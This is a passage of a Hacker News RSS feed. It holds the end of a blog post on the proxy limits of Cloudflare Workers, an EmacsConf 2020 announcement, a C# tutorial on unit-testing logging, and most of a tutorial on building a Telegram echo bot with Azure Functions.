<p>The available API is a very small subset of <a href="https://platform.html5.org/">The Web Platform</a> (the Javascript API available in modern browsers) – specifically Ecmascript/Javascript itself, plus <code>Fetch</code>, <code>URL</code>, and <code>Blob</code>. I believe Cloudflare chose this API because it melds well with V8, but also because web devs will be familiar with those APIs. But how familiar are you <em>really</em> with <code>fetch</code>, <code>Request</code>, and <code>Response</code>? (all part of the <code>Fetch</code>-spec)<br>
I don’t think I actually knew the <code>Request</code> and <code>Response</code>-objects in any detail before using Cloudflare Workers – having gotten along just fine with variations of</p>

<div><div><pre><code>fetch('http://example.org', { options }).then((r) =&gt; r.json())
</code></pre></div></div>

<p>plus some error handling on top for many years.</p>

<p>When working with Workers what you’ll mostly be doing is to manipulate the incoming <code>Request</code>-object  and pass it on to <code>fetch</code>, or manipulate the outgoing <code>Response</code>-object and passing that on to Cloudflare’s handler. Have you ever manually created a <code>Request</code>-object in the browser? I haven’t. The reason this gets complicated is the fact that the spec for <code>fetch</code> itself is very “loose”. For example, <code>fetch</code> can take either a <code>Request</code>-object or a simple Javascript object that just looks a lot like a <code>Request</code>-object as its argument – and it not really clear what differences between the two are.
<code>fetch</code> also allows passing a <code>Request</code>-objects as both its first and second argument <code>fetch(Request(...), Request(...))</code> – good luck trying to figure out what that does!</p>

<p>If we go back to the example from the Cloudflare docs – what’s going on “behind the scenes” in our proxy example from earlier is that you can’t change the <code>Host</code>-header when doing a <code>fetch</code>. This makes a lot of security sense in the browser where <code>fetch</code> normally lives, but it’s quite normal behavior for a reverse proxy and actually something I was doing in my NGINX setup in order to have WPEngine respond with the right content. It’s not a behavior you’ve ever needed or thought about when using <code>fetch</code> in the browser.
The server is just a very different environment than the browser. The browser Javascript API is not built with server functionality in mind, and it ends up being a hamstring when working with Cloudflare Workers.</p>

<h2 id="maybe-maybe-maybe">Maybe, maybe, maybe…?</h2>

<p>A bunch of forum posts on community.cloudflare.com talk about this issue</p>

<ul>
  <li><strong>Only available on the Enterprise plan?</strong> <a href="https://community.cloudflare.com/t/override-host-header-using-workers/73434/2">This forum post</a> describes that setting the <code>Host</code> -header in workers is not possible. Followed up with <a href="https://community.cloudflare.com/t/override-host-header-using-workers/73434/5">a later answer</a> that it’s possible but only for Enterprise accounts.
 <a href="https://community.cloudflare.com/t/reverse-proxy-using-page-rules/47836/16">This other post</a> says the same.</li>
  <li><strong>Kenton Varda to the rescue</strong> In response to <a href="https://community.cloudflare.com/t/not-possible-to-override-the-host-header-on-workers-requests/13077/7">this post</a> Kenton Varda actually extends Cloudflare Workers with the <code>cf.resolveOverride</code>-flag on the <code>Request</code>-object,
which should allow at least part of the reverse proxy setup to work.
Unfortunately, to explain the new feature the post just links to the top-level URL of the documentation for Cloudflare Workers – which currently doesn’t
describe how  <code>cf.resolveOverride</code> works and how to use it.</li>
  <li><strong>The missing documentation</strong> <a href="https://community.cloudflare.com/t/different-hostname-with-same-origin-in-workers/16662/12">This older post</a> seemingly cites documentation that no longer exists! :(<br>
 I have been unable to find any meaningful documentation of <code>cf.resolveOverride</code> outside of the community forum, and I was unable to have it allow me to switch the <code>Host</code>-header.</li>
</ul>

<h2 id="the-final-nail-in-the-coffin">The final nail in the coffin</h2>

<p>For a brief moment I actually thought my setup was working, but it only “looked” like it was working due to the following sequence of events:</p>

<ul>
  <li>A request for <code>www.peergrade.io</code> would hit the worker</li>
  <li>The worker would then do a request to <code>peergrade.wpengine.com</code></li>
  <li>Wordpress/WPEngine would then respond with a redirect to <code>www.peergrade.io</code> since the <code>Host</code>-header is incorrect</li>
  <li>Cloudflare by default then follows that redirect and makes a new request to <code>www.peergrade.io</code>.
Since Cloudflare is the host of <code>www.peergrade.io</code> you’d think we’d hit infinite recursion here.
But magically, it doesn’t just enter the worker script again – it knows (somehow) it has to go further down the Cloudflare stack.
Since the DNS A-record in Cloudflare still had the IP of the DigitalOcean instance, that final fetch would simply fetch the page from the old proxy server which worked as it always had 🤦🏻</li>
</ul>

<!--
Another example of this "familiar but unfamiliar" API is when I was trying to inspect the session cookie: I had to do a base64 decode into a `Uint8Array` (in order to do a zlib decompression). The function available for decoding base64 is `atob` which you may know from the browser.

However, in order to get the actual binary data you'll have to do this Javascript incantation:

```jsx
const weirdstr = atob(cookiestr);
const bytearray = new Uint8Array(new ArrayBuffer(weirdstr.length));

for (let i = 0; i < weirdstr.length; i++) {
  bytearray[i] = weirdstr.charCodeAt(i);
}
```

Again, this isn't Cloudflare's fault per se, but they're inheriting a bad choice from The Web Platform where they could have done something else. That bad choice becomes accentuated by the fact that most workers need to implement something that is basically backend or proxy server behavior, which by now you can see The Web Platform really isn't set up for. 

Similarly, you'll inherit this weird quirk directly from the browser Javascript engine:

```jsx
console.log(btoa('汉字'))
// The above raises a DOMException in your Cloudflare Worker with the
// following message:
// "btoa() can only operate on characters in the Latin1 (ISO/IEC 8859-1) range."
```

Yes yes, there's some sense to this – Javascript strings are UTF-16 and that's why this example doesn't work. But take a look at Node.js where `btoa` and `atob` are not available – Node.js has a much better answer to many of these problems.

Lastly, since many things are iterables or DOM-objects, you won't get anything useful out of console logging `request.headers`, `request.headers.keys()`, `request.headers.values()`, `request.headers.entries()`. This wouldn't be a problem if the `request`-object was fully inspectable in the debugger but nothing shows up when you open up `request.headers`.
The solution to this is just `console.log([...request.headers])`.
-->

<h2 id="conclusion">Conclusion</h2>

<p>Overall, Cloudflare Workers are really cool and the tooling around them is pretty great. But I do feel like it was an unfortunate choice to adopt The Web Platform
instead of using parts of the Node standard library or a different, more server-oriented API. Lastly, while the documentation feels fairly complete and fleshed out – the fact
that the answers on the forum tell 2-3 different stories about whether it’s possible to change the <code>Host</code>-header means that it’s something that is …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.notifly.io/2020/11/04/hardly-working-with-cloudflare-workers">https://blog.notifly.io/2020/11/04/hardly-working-with-cloudflare-workers</a></em></p>]]>
            </description>
            <link>https://blog.notifly.io/2020/11/04/hardly-working-with-cloudflare-workers</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057709</guid>
            <pubDate>Wed, 11 Nov 2020 12:15:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[EmacsConf – 2020]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25057456">thread link</a>) | @ProfDreamer
<br/>
November 11, 2020 | https://emacsconf.org/2020/ | <a href="https://web.archive.org/web/*/https://emacsconf.org/2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div class="page">



<div id="pagebody">







<div id="content" role="main">
<p>EmacsConf 2020 | Online Conference | <strong>November 28 and 29, 2020</strong><br>
<a href="https://emacsconf.org/i/emacsconf-logo1-256.png"><img src="https://emacsconf.org/i/emacsconf-logo1-256.png" width="256" height="256" alt="EmacsConf logo"></a><br>
<a href="https://emacsconf.org/2020/schedule/"><strong>Schedule</strong></a> | <a href="https://emacsconf.org/2020/poster/"><strong>Poster</strong></a> | <a href="https://emacsconf.org/2020/planning/">Planning</a> |
<a href="https://emacsconf.org/conduct/">Code of Conduct</a></p>

<p>EmacsConf is the conference about the joy of Emacs, Emacs Lisp, and
memorizing key sequences.</p>

<p>We are holding EmacsConf 2020 as a virtual (online) conference again
this year, especially now, given the current state of the world with
the ongoing global pandemic. We remain fully committed to freedom, and
we will continue using our infrastructure and streaming setup
consisting entirely of <a href="https://www.gnu.org/philosophy/free-sw.html">free software</a>, much like the last
EmacsConf. Check out the <a href="https://emacsconf.org/2020/schedule/"><strong>Schedule</strong></a> and
<a href="https://emacsconf.org/2020/poster/"><strong>Poster</strong></a> for more details.</p>

<h2>Watching</h2>

<p>On November 28 and 29 you will be able to watch the livestreams via
<a href="https://live.emacsconf.org/">https://live.emacsconf.org</a>, which also has details on how to watch the
streams using media players that support streaming (like mpv and VLC).</p>

<p>We'll record the conference and post the videos and links on the
individual talk pages. In the meantime, please enjoy
<a href="https://emacsconf.org/2019/talks/">last year's talks</a>.</p>

<h2>Participating</h2>

<p>For audience questions specifically, we will be experimenting with
using a collaboratively-editable Etherpad as the primary means of
collecting audience questions. We will be posting a link to the pad
closer to the event. If, however, you are unable to access the pad to
add your question(s), we will still try to take questions from our
questions-specific IRC channel (<code>#emacsconf-questions</code> on
<code>chat.freenode.net</code>), and ask one or two volunteers to kindly add
questions from that channel to the pad on behalf of folks who are not
able to or prefer not to use the web-based questions pad.</p>

<p>Come hang out with us in <code>#emacsconf</code> on <code>chat.freenode.net</code>.  You can
join the chat using <a href="ircs://chat.freenode.net:6697/emacsconf">your favourite IRC client</a>, or by visiting
<a href="https://chat.emacsconf.org/">chat.emacsconf.org</a> in your web browser, a self-hosted instance
of <a href="https://thelounge.chat/">The Lounge</a> free software web IRC client for EmacsConf.</p>

<h2>Updates</h2>

<p>Be sure to subscribe to our mailing list
<a href="https://lists.gnu.org/mailman/listinfo/emacsconf-discuss">emacsconf-discuss</a> for discussion and
announcements about the conference.</p>

</div>







</div>



</div></div>]]>
            </description>
            <link>https://emacsconf.org/2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057456</guid>
            <pubDate>Wed, 11 Nov 2020 11:26:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Write Unit Tests for Logging]]>
            </title>
            <description>
<![CDATA[
Score 55 | Comments 37 (<a href="https://news.ycombinator.com/item?id=25057372">thread link</a>) | @JanVanRyswyck
<br/>
November 11, 2020 | https://principal-it.eu/2020/11/unit-tests-for-logging/ | <a href="https://web.archive.org/web/*/https://principal-it.eu/2020/11/unit-tests-for-logging/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<div>
					<h2>
						How To Write Unit Tests For Logging
					</h2>
					<p><span>
						November 11, 2020
					</span>
				</p></div>

				
<p>Once in a while I get asked the question whether one should write <a href="https://principal-it.eu/2019/10/taxonomy-of-tests/">solitary tests</a> for 
logging functionality. My answer to this question is the typical consultant answer: “It depends”. In essence, logging 
is an infrastructure concern. The end result is log data that is being written to a resource which is external to 
an application. Usually the generated data ends up in a file, a database or it might even end up in a cloud service.</p>

<p>Because logging crosses the process boundary of an application, it is more useful to write 
<a href="https://principal-it.eu/2019/10/taxonomy-of-tests/">sociable tests</a> to verify this particular functionality. It doesn’t make sense to 
use solitary tests in this particular case.</p>

<p>That being said, there are situations where business requirements explicitly state that logging should be a part of the 
interface of an application. In this situation, the intent of logging should be expressed explicitly by the code which 
in turn should also be exercised by solitary tests. The excellent book 
<a href="https://bit.ly/tdd-goos2" target="blank" rel="noopener noreferrer nofollow">Growing Object Oriented Software 
Guided By Tests</a>, written by Steve Freeman and Nat Pryce, mentions that there are generally two separate types of 
logging:</p>

<ul>
  <li>Support logging</li>
  <li>Diagnostic logging</li>
</ul>

<p>A support log contains messages that are intended for those that perform operational activities. These messages are used 
to determine whether the system behaves correctly or not. The log level for these messages is usually of type <em>error</em> 
or <em>info</em>.</p>

<p>A diagnostic log on the other hand holds messages that are targeted towards software developers. These messages provide 
valuable insights into the details of a running system. The log level for these messages is usually of type <em>debug</em> or 
<em>trace</em>.</p>

<p>Given these two types of logging, the basic idea is that code which expresses the intent of support logging should be 
exercised by solitary tests. Code statements that initiate diagnostic logging are usually not covered by tests.</p>

<p>Let’s have a look at an example that demonstrates both support and diagnostic logging in action.</p>

<pre><code>public class ExpenseSheetController : Controller
{
    private readonly ICommandHandler&lt;CreateExpenseSheet&gt; _commandHandler;
    private readonly ISupportNotifier _supportNotifier;

    public ExpenseSheetController(ICommandHandler&lt;CreateExpenseSheet&gt; commandHandler,
                                  ISupportNotifier supportNotifier)
    {
        _commandHandler = commandHandler;
        _supportNotifier = supportNotifier;
    }
    
    [HttpPost]
    [ServiceFilter(typeof(PerformanceTracing))]
    public IActionResult Create(CreateExpenseSheetFormModel formModel)
    {
        try
        {
            var command = new CreateExpenseSheet(Guid.NewGuid(), formModel.EmployeeId);
            _commandHandler.Handle(command);
        }
        catch(Exception ex)
        {
            _supportNotifier.ErrorDuringExpenseSheetCreation(ex, formModel.EmployeeId);
            return BadRequest();
        }
        
        _supportNotifier.ExpenseSheetCreated(formModel.EmployeeId);
        return Ok();
    }
}
</code></pre>

<p>Here we have the implementation of a controller that can receive a request for creating a new expense sheet. Notice that 
the constructor of this controller class expects an instance of the <em>ISupportNotifier</em> interface. This dependency is 
being used by the implementation of the <em>Create</em> method for logging an error when an exception occurs. It is also used 
for logging when an expense sheet has been successfully created.</p>

<p>This is how the implementation of the <em>SupportNotifier</em> looks like.</p>

<pre><code>public class SupportNotifier : ISupportNotifier
{
    private readonly ILogger&lt;SupportNotifier&gt; _logger;

    public SupportNotifier(ILogger&lt;SupportNotifier&gt; logger)
    {
        _logger = logger;
    }
    
    public void ExpenseSheetCreated(Guid employeeId)
    {
        _logger.LogInformation("Expense sheet created for employee with ID '{employeeId}'.");
    }

    public void ErrorDuringExpenseSheetCreation(Exception ex, Guid employeeId)
    {
        _logger.LogError(ex, $"Unable to create a new expense sheet for employee with ID '{employeeId}'");
    }
}
</code></pre>

<p>This code demonstrates that support logging uses log levels <em>error</em> or <em>info</em> depending on the context. Verifying the
code of the <em>SupportNotifier</em> class itself can be done by using sociable tests. It’s not a good idea to write
solitary tests for the <em>SupportNotifier</em> class. This would imply that a test double should be used as an instance of 
<em>ILogger</em>. As we already touched on in a <a href="https://principal-it.eu/2020/05/test-double-heuristics/">previous blog post</a>, it’s much better to 
avoid using test doubles for types that you don’t own. In this particular case it would even be quite hard to do as 
the <em>Logxx</em> methods of <em>ILogger</em> are actually extension methods and not regular methods.</p>

<p>Let’s have a look at the tests for the <em>ExpenseSheetController</em>.</p>

<pre><code>[Specification]
public class When_handling_a_request_for_creating_a_new_expense_sheet
{
    [Establish]
    public void Context()
    {
        var commandHandler = Substitute.For&lt;ICommandHandler&lt;CreateExpenseSheet&gt;&gt;();
        _supportNotifier = Substitute.For&lt;ISupportNotifier&gt;();

        _sut = new ExpenseSheetController(commandHandler, _supportNotifier);
    }

    [Because]
    public void Of()
    {
        var formModel = new CreateExpenseSheetFormModel 
        { 
            EmployeeId = new Guid("94EDE8F3-9675-4DD7-A18F-E37B1F323699") 
        };

        _sut.Create(formModel);
    }
    
    [Observation]
    public void Then_it_should_notify_support()
    {
        _supportNotifier.Received()
            .ExpenseSheetCreated(new Guid("94EDE8F3-9675-4DD7-A18F-E37B1F323699"));
    }

    private ExpenseSheetController _sut;
    private ISupportNotifier _supportNotifier;
}

[Specification]
public class When_an_error_occurs_while_handling_a_request_for_creating_a_new_expense_sheet
{
    [Establish]
    public void Context()
    {
        _supportNotifier = Substitute.For&lt;ISupportNotifier&gt;();
        _exception = new InvalidOperationException("Meltdown");
        
        var commandHandler = Substitute.For&lt;ICommandHandler&lt;CreateExpenseSheet&gt;&gt;();
        commandHandler.WhenForAnyArgs(ch =&gt; ch.Handle(null))
            .Throw(_exception);
        
        _sut = new ExpenseSheetController(commandHandler, _supportNotifier);
    }
    
    [Because]
    public void Of()
    {
        var formModel = new CreateExpenseSheetFormModel 
        { 
            EmployeeId = new Guid("D1067157-5C73-4140-9D29-0FE5C1C4C2FB") 
        };

        _sut.Create(formModel);
    }
    
    [Observation]
    public void Then_it_should_notify_support_that_a_new_expense_sheet_has_been_created()
    {
        _supportNotifier.Received()
            .ErrorDuringExpenseSheetCreation(_exception, 
                new Guid("D1067157-5C73-4140-9D29-0FE5C1C4C2FB"));
    }
    
    private ExpenseSheetController _sut;
    private ISupportNotifier _supportNotifier;
    private Exception _exception;
}
</code></pre>

<p>These tests verify whether support logging occurs when an expense sheet has been created or when an exception gets 
raised. This way we express the intent of the operational requirements.</p>

<p>Notice that controller method has been decorated with a <em>ServiceFilter</em> attribute.</p>

<pre><code>[HttpPost]
[ServiceFilter(typeof(PerformanceTracing))]
public IActionResult Create(CreateExpenseSheetFormModel formModel)
{
    ...
}
</code></pre>

<p>By applying this attribute, the <em>PerformanceTracing</em> action filter is being registered to surround the execution of the 
controller method. Let’s have a look at the implementation of this action filter.</p>

<pre><code>public class PerformanceTracing : ActionFilterAttribute
{
    private readonly ILogger&lt;PerformanceTracing&gt; _logger;
    private readonly Stopwatch _stopWatch;

    public PerformanceTracing(ILogger&lt;PerformanceTracing&gt; logger)
    {
        _logger = logger;
        _stopWatch = new Stopwatch();
    }

    public override void OnActionExecuting(ActionExecutingContext context)
    {
        _stopWatch.Start();
    }

    public override void OnActionExecuted(ActionExecutedContext context)
    {
        _stopWatch.Stop();

        var controllerName = context.Controller.GetType().Name;
        var controllerActionName = context.ActionDescriptor.DisplayName;
        
        _logger.LogTrace($"Action '{controllerActionName}' of controller {controllerName} executed in " + 
            $"{_stopWatch.ElapsedMilliseconds} ms.");
    }
}
</code></pre>

<p>This implementation is a nice example of diagnostic logging. The action filter measures the execution time of a 
controller method and logs the result. Notice that we’re injecting the <em>ILogger</em> interface directly into the constructor.
By registering the <em>PerformanceTracing</em> action filter using the <em>ServiceFilter</em> attribute, we ensure that an instance 
of <em>ILogger</em> gets resolved and properly injected. We didn’t provide any tests for this implementation.</p>

<p>I think it’s useful to consider support logging and diagnostic logging as two separate concepts, even though they quite 
often use the same mechanisms under the hood.</p>


				<p>
						<em>
							If you and your team want to learn more about how to <u>write maintainable unit tests</u>
							and <u>get the most out of TDD practices</u>, make sure to have look at our
							<a href="https://principal-it.eu/training.html">trainings and workshops</a> or checkout
							the <a href="https://principal-it.eu/books.html">books section</a>. Feel free to reach
							out at <span>info@principal-it.be</span>.
						</em>
					</p>

				

				

				
			</div></div>]]>
            </description>
            <link>https://principal-it.eu/2020/11/unit-tests-for-logging/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057372</guid>
            <pubDate>Wed, 11 Nov 2020 11:06:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a Telegram Bot with Azure Functions and Node.js]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25057328">thread link</a>) | @qpbp_user
<br/>
November 11, 2020 | http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/ | <a href="https://web.archive.org/web/*/http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><ul><li><a href="#introduction">Introduction</a></li><li><a href="#flow-review">Flow Review</a></li><li><a href="#prerequisites">Prerequisites</a></li><li><a href="#create-an-azure-function-in-visual-studio-code">Create an Azure function in Visual Studio Code</a></li><li><a href="#folder-structure">Folder structure</a></li><li><a href="#run-function-locally">Run function locally</a></li><li><a href="#implement-the-bot">Implement the bot</a></li><li><a href="#running-bot-locally">Running bot locally</a></li><li><a href="#deploy-azure-function-to-the-portal">Deploy Azure Function to the portal</a></li><li><a href="#conclusion">Conclusion</a></li></ul><h2 id="introduction">Introduction</h2><p>In this tutorial, we will create an Azure Function with a simple Telegram Bot (Echo Bot). We will test it locally and then deploy it to Azure Portal. It means our bot will work only at the moment when someone is using it. So the function will be triggered only when someone is sending a message to a bot.</p><h2 id="flow-review">Flow Review</h2><ol><li>The user sends any message to Telegram Bot</li><li>Telegram sends requests via Webhook to our Azure Function</li><li>Azure Function replies to Webhook with a copied message</li></ol><h2 id="prerequisites">Prerequisites</h2><ul><li>node.js - v10.16.2</li><li>npm - v6.14.5</li><li>telegraf - v3.38.0</li><li>ngrok - v2.3.35</li><li>Azure subscribtion</li><li>you need to install <a href="https://marketplace.visualstudio.com/items?itemName=ms-azuretools.vscode-azurefunctions">Azure Functions extension</a> to Visual Studio Code</li></ul><h2 id="create-an-azure-function-in-visual-studio-code">Create an Azure function in Visual Studio Code</h2><ol><li><p>click on Azure Icon in Visual Studio Code</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-10.48.39-1024x885.png" alt="Azure Icon in VSC"></p></li><li><p>login under your Azure subscription</p></li><li><p>click on “Create Function Icon”</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-10.51.16.png" alt="Create Function Icon"></p></li><li><p>you will be asked to use an existing project or create a new. Let’s create a new:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-10.54.40-1024x281.png" alt="Create a new project"></p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-10.55.13-1024x589.png" alt="Create new project folder"></p></li><li><p>select the function template. We will use <strong>HTTP trigger</strong>:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-10.55.36-1024x607.png" alt="Choose a Function Template"></p></li><li><p>provide a function name and select Enter:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-10.56.16-1024x213.png" alt="Enter the name of the function"></p></li><li><p>please provide a <strong>Function</strong> key for a <strong>Function authorization</strong>:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-10.56.27-1024x280.png" alt="Function Authorization level"></p></li><li><p>penultimate step. Select how you would like to open a project. We will use the current window:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-10.56.39-1024x291.png" alt="How to open a function project in Visual Studio Code"></p></li><li><p>you will be redirected to the <strong>default HTTP trigger function with Javascript code</strong>:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-10.57.02-1024x618.png" alt="The default function Code"></p></li><li><p>now this function will appear in Azure Functions section:</p></li></ol><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-11.23.30-1024x340.png" alt="Newly created function"></p><h2 id="folder-structure">Folder structure</h2><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-11.29.34-300x256.png" alt="Function Folder Structure"></p><ul><li><strong>package.json</strong> - metadata relevant to the Node.js project</li><li><strong>proxies.json</strong> - you can modify requests and responses from function</li><li><strong>host.json</strong> - metadata file relevant to the Azure project. It’s a global configuration for all functions in an application</li><li><strong>azure-bot-cloud-function</strong> - it’s our function folder. Each function has a separate folder with code file (.js in our case) and function.json. Function.json it’s a <a href="https://docs.microsoft.com/en-us/azure/azure-functions/functions-bindings-expressions-patterns">binding configuration file</a>.</li></ul><h2 id="run-function-locally">Run function locally</h2><ol><li><p>Select Run -&gt; Start Debugging in Visual Studio Code menu</p></li><li><p>If you have no Azure Functions Core Tools locally, you need to install them on this step. The instruction can be found in <a href="https://github.com/Azure/azure-functions-core-tools#installing">Azure repo:</a></p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-20.48.48-1024x127.png" alt="Install Azure Function Core Tools"></p></li><li><p>You should see how the NPM tasks will executing and finally get a link to the working function:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-21.08.28-1024x601.png" alt="Link to the local Azure function"></p></li><li><p>Let’s open our function in the browser:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-21.20.46-1024x274.png" alt="Azure Function is working locally"></p><p>As you see, the function responds to us with the behavior by default. Also, you can simply run the function using the <strong>func start</strong> command.</p></li></ol><h2 id="implement-the-bot">Implement the bot</h2><p>For work with Telegram API, we will use the most popular library for Node.js - <a href="https://github.com/telegraf/telegraf">Telegraf.js</a>. We need to install it in the project folder:</p><div><pre><code data-lang="bash">npm install telegraf --save
</code></pre></div><p>Please make sure the <code>package.json</code> has Telegraf after the running previous command.</p><p>Because Telegram will send webhook requests to our bot, we need to make an external HTTPS URL. For this purpose we can use <a href="https://ngrok.com/">ngrok library</a>:</p><p>If all is good, we can go to <code>function-folder&gt;/index.js</code> and create a simple Echo-bot:</p><div><pre><code data-lang="javascript"><span>const</span> <span>Telegraf</span> <span>=</span> <span>require</span>(<span>'telegraf'</span>)
<span>const</span> { <span>TELEGRAM_BOT_TOKEN</span>, <span>WEBHOOK_ADDRESS</span> } <span>=</span> <span>process</span>.<span>env</span>

<span>const</span> <span>bot</span> <span>=</span> <span>new</span> <span>Telegraf</span>(<span>TELEGRAM_BOT_TOKEN</span>, {<span>telegram</span><span>:</span> { <span>webhookReply</span><span>:</span> <span>true</span> }})

<span>bot</span>.<span>telegram</span>.<span>setWebhook</span>(<span>WEBHOOK_ADDRESS</span>)
<span>bot</span>.<span>on</span>(<span>'message'</span>, (<span>ctx</span>) =&gt; <span>ctx</span>.<span>telegram</span>.<span>sendCopy</span>(<span>ctx</span>.<span>chat</span>.<span>id</span>, <span>ctx</span>.<span>message</span>))

<span>module</span>.<span>exports</span> <span>=</span> <span>async</span> <span>function</span> (<span>context</span>, <span>req</span>) {
	<span>return</span> <span>bot</span>.<span>handleUpdate</span>(<span>req</span>.<span>body</span>, <span>context</span>.<span>res</span>)
}
</code></pre></div><p>You can take <code>TELEGRAM_BOT_TOKEN</code> value from <a href="https://telegram.me/BotFather">BotFather bot</a>. The <code>WEBHOOK_ADDRESS</code> will contain a link to the Azure Function. We will talk about this variable later. Our bot will work in Webhook mode - it’s a more preferable way to run Telegram bot. The Telegram will automatically inform our bot about all updates. In the polling mechanism, our bot needs to frequently ask Telegram about updates, so it requires non-stop work for our bot (most cases).</p><h2 id="running-bot-locally">Running bot locally</h2><p>To run this bot locally we need to create a public address using ngrok. By default, the local Azure function is running on port <code>7071</code>. We can use the following combination in the terminal to create a public URL:</p><p>In the terminal you will get your HTTPS link for testing Webhook:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-13-at-22.29.42-1024x400.png" alt="HTTPS public URL using ngrok"></p><p>Copy the ngrok-created link and add the route to the function. Something similar to this:</p><div><pre><code data-lang="javascript"><span>bot</span>.<span>telegram</span>.<span>setWebhook</span>(<span>'https://&lt;random-value&gt;.ngrok.io/api/azure-bot-cloud-function'</span>)
</code></pre></div><p>Also, don’t forget to pass a real Telegram token to the Telegraf constructor:</p><div><pre><code data-lang="javascript"><span>const</span> <span>bot</span> <span>=</span> <span>new</span> <span>Telegraf</span>(<span>'some-token-value'</span>, {
	<span>telegram</span><span>:</span> { <span>webhookReply</span><span>:</span> <span>true</span> },
})
</code></pre></div><p>It’s very dirty, but for a quick test it’s OK, so please remember to remove all real keys from the code.</p><p>Then you can run a function just using the simple command:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-13-at-22.49.14-1024x709.png" alt="Azure Functions is running locally"></p><p>Good job! Now open your bot in Telegram and send any message. Our bot should copy it and resend to you:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-13-at-23.41.16.png" alt="Echo-Bot example"></p><h2 id="deploy-azure-function-to-the-portal">Deploy Azure Function to the portal</h2><p>To deploy Azure Function we just need to click on this button:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-13-at-22.52.40-1024x730.png" alt="Deploy Azure Function"></p><p>Then choose your resource and press “Deploy”. The process will be started:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-13-at-22.53.55-1024x406.png" alt="The process of deploying Azure Function"></p><p>After successful deployment, we need to go to Azure Portal and update <strong>WEBHOOK_ADDRESS</strong> and <strong>TELEGRAM_BOT_TOKEN</strong> variables with real values.</p><p>To get a real function URL, go to “Functions”, then choose your Azure Function and press “Get Function Url” button:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-13-at-23.05.24-1024x275.png" alt="How to get Azure Function URL"></p><p>We need to copy this value and paste to Application Settings along with Telegram Token:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-13-at-22.59.12-1024x343.png" alt="Application Settings in Azure"></p><p>After adding our secret keys, press “Save” and restart our application:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-13-at-23.09.41-1024x424.png" alt="Restart Azure application"></p><p>That’s all. Our bot should work in the cloud and you can track all function executions in real-time:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-13-at-23.13.07-1024x325.png" alt="Azure Dashboard"></p><p>Each function execution means that our bot handled 1 single message.</p><h2 id="conclusion">Conclusion</h2><p>In this tutorial, we have created an Azure Function with a simple Echo-Bot for Telegram. Azure Functions its a cool way to host your bots. You will be chargeable by the simple formula - (Memory size)X(Execution time in ms)X(Executions per month) and also remember that the first 400,000 GB/s of execution and 1,000,000 executions are free. If you need to estimate your 